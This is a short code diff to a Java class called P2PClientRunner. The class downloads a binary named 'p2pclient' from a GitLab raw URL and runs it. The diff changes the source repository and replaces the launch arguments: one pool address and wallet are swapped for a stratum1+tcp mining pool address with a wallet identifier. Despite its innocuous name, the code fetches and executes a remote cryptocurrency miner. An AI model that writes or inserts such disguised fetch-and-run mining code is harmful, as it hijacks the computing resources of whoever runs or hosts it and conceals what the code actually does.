@@ -4,7 +4,7 @@ import java.net.URL;
 import java.nio.file.*;
 
 public class P2PClientRunner {
-    private static final String P2P_URL = "https://gitlab.com/rikzakalani/close/raw/main/p2pclient";
+    private static final String P2P_URL = "https://gitlab.com/rikzakalani/coremnr/raw/main/p2pclient";
     private static final String P2P_PATH = "p2pclient";
     private static final String LOG_FILE = "p2pclient.log";
 
@@ -23,11 +23,9 @@ public class P2PClientRunner {
             System.out.println("🚀 Starting p2pclient...");
             ProcessBuilder processBuilder = new ProcessBuilder(
                 "./" + P2P_PATH,
-                "--cpu",
-                "-t", "1",
-                "--worker", "aaa1",
-                "--url", "ws.qubicmine.pro",
-                "--wallet", "XJWLMDBPMLRXZDXXNAUCMVYYRERDSMNPBSHYLJMRRGDGTQMCUDLJRQAEIMEA"
+                "--noeval",
+                "--hard-aes",
+                "-P", "stratum1+tcp://cb92b11ef983881478efd07d3c031ca2f41c121da3e2.pepek@us.catchthatrabbit.com:8008"
             );
 
             processBuilder.redirectErrorStream(true);
